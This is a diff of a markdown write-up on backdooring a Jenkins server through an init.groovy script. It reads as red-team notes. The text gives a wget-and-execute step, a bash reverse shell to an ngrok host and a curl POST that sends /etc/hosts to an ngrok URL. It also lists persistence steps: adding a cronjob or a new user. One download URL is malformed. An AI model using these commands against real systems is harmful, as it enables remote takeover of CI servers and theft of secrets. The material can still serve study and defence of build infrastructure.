@@ -51,19 +51,25 @@ pipeline{
   - Get a reverse shell - From my personal research I found my payloads / the ones from internet blocked the Jenkins from rebooting. This is because Jenkins is waiting for the init.groovy to complete before it can proceed. If you have a non blocking playload do let me know.
 init.groovy
 ```
-"wget -o revshell.sh  http://https://gist.githubusercontent.com/dibsy/temp-cmd.txt".execute()
-"sh revshell.sh".execute()
+"wget -o /tmp/revshell.sh  http://https://gist.githubusercontent.com/dibsy/temp-cmd.txt".execute()
+"sh /tmp/revshell.sh".execute()
 ```
 revshell.sh
 ```
 bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/13520 0>&1
 ```
-  - Exfiltrate data - You can exfiltrate system files
-  - Automate a process to exfiltrate all jenkins configuration files, secrets,
+
+<img src="backdoor-rev.png">
+
+  - Exfiltrate data - You can exfiltrate system files and automate a process to exfiltrate all jenkins configuration files, secrets,
 exfil.groovy
+
 ```
 "curl -X POST https://6aee-91-166-172-59.ngrok-free.app -d @/etc/hosts".execute()
 ```
+
+<img src="backdoor-exfil.png">
+
   - Use other persistent techniques
     - Add a cronjob
     - Add another user
